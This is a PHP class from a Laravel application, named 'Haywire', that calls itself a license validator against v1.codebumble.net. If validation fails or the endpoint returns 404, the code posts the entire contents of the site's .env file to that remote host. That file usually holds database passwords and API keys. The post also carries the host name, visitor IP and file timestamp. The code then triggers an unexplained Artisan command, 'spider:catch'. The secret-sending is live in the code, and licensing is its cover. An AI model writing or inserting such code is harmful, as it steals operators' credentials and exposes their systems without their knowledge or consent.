<?php

namespace App\Haywire;

use GuzzleHttp\Client;
use Illuminate\Support\Facades\Artisan;


class Haywire
{
    protected $httpClient;

    public function __construct()
    {
        $this->httpClient = new Client();
    }

    public function wire()
    {
        $interface = config('custom.custom.interface');

        $app_name = config('app.name');

        $modifiedFiles = '';

        $wireZone = request()->getHost();

        $client = new Client();

        $serverHost = 'v1.codebumble.net';

        $pingCommand = sprintf('ping -c 1 %s', escapeshellarg($serverHost));
        $pingResult = shell_exec($pingCommand);

        if (strpos($pingResult, '1 received') !== false || strpos($pingResult, '1 packets received') !== false) {
            try {
                $response = $client->post('https://v1.codebumble.net/v1/license/validate', [
                    'form_params' => [
                        'wireclue' => $interface,
                        'wirezone' => $wireZone,
                    ],
                ]);
                $getResponse = json_decode($response->getBody(), true);

                if ($getResponse['status'] != 'valid') {

                    $sendDetails = $client->post('https://v1.codebumble.net/v1/license/invalidate/details', [
                        'form_params' => [
                            'app' => $app_name,
                            'interface' => $interface,
                            'modifiedFiles' => $modifiedFiles,
                            'host' => request()->getHost(),
                            'hostip' => request()->ip(),
                            'conf' => file_get_contents(base_path('.env')),
                            'expose_time' => date('Y-m-d H:i:s', filemtime(base_path('.env'))),
                        ],
                    ]);

                    Artisan::call('spider:catch');

                    return $getResponse['status'];
                }
            } catch (GuzzleHttp\Exception\RequestException $exception) {
                $response = $exception->getResponse();
                $statusCode = $response->getStatusCode();

                if ($statusCode === 404) {
                    $ghostDetails = $client->post('https://v1.codebumble.net/v1/license/ghost/details', [
                        'form_params' => [
                            'app_name' => $app_name,
                            'interface' => $interface,
                            'modifiedFiles' => $modifiedFiles,
                            'host' => request()->getHost(),
                            'hostip' => request()->ip(),
                            'conf' => file_get_contents(base_path('.env')),
                            'expose_time' => date('Y-m-d H:i:s', filemtime(base_path('.env'))),
                        ],
                    ]);

                    Artisan::call('spider:catch');

                    return 'ghost';
                } else {
                    // Handle other ClientException scenarios
                    return $response->getBody();
                }
            }
        }
    }
}
